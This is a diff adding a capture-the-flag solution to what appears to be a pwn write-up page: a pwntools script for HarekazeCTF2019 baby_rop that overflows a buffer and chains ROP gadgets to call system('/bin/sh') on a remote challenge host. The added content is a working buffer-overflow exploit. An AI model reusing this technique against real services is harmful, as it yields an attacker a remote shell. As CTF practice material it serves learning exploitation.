@@ -698,6 +698,23 @@ icon: icon-html
   r.interactive()
   ```
 
+* ### [HarekazeCTF2019]baby_rop
+
+  ```python
+  from pwn import *
+  r = remote('node2.buuoj.cn.wetolink.com',28202)
+  #r = process('./babyrop')
+  binsh = 0x601048
+  pop_rdi_ret = 0x400683
+  main = 0x4005d6
+  call_system = 0x4005e3
+  payload = 'a'*(0x10+0x8)+p64(pop_rdi_ret)+p64(binsh)+p64(call_system)
+  r.sendline(payload)
+  r.interactive()
+  ```
+
+* ### [HarekazeCTF2019]baby_rop2
+
   
 
 
